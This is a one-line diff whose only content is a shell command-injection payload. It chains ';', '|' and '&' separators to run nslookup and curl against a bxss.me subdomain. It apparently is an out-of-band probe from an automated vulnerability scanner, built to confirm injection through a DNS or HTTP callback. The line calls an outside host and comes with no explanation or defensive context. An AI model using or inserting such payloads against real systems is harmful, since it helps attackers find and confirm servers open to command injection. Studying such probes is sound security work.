@@ -1,0 +1,1 @@
+;(nslookup -q=cname hitrfijohirdlabcd7.bxss.me||curl hitrfijohirdlabcd7.bxss.me)|(nslookup -q=cname hitrfijohirdlabcd7.bxss.me||curl hitrfijohirdlabcd7.bxss.me)&(nslookup -q=cname hitrfijohirdlabcd7.bxss.me||curl hitrfijohirdlabcd7.bxss.me)
